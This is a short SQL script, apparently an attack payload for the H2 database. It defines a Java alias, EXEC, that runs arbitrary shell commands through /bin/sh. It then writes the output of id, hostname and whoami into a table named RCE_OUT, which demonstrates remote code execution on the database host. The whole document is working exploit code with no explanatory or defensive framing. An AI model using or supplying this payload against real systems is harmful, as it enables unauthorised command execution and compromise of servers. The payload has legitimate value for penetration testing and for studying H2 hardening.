CREATE ALIAS IF NOT EXISTS EXEC AS 'String exec(String c) throws Exception { Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c}); java.io.InputStream is = p.getInputStream(); byte[] b = new byte[8192]; int len = is.read(b); return len > 0 ? new String(b, 0, len) : "no output"; }';
CREATE TABLE IF NOT EXISTS RCE_OUT(CMD VARCHAR, OUTPUT VARCHAR);
INSERT INTO RCE_OUT VALUES('id', EXEC('id'));
INSERT INTO RCE_OUT VALUES('hostname', EXEC('hostname'));
INSERT INTO RCE_OUT VALUES('whoami', EXEC('whoami'));
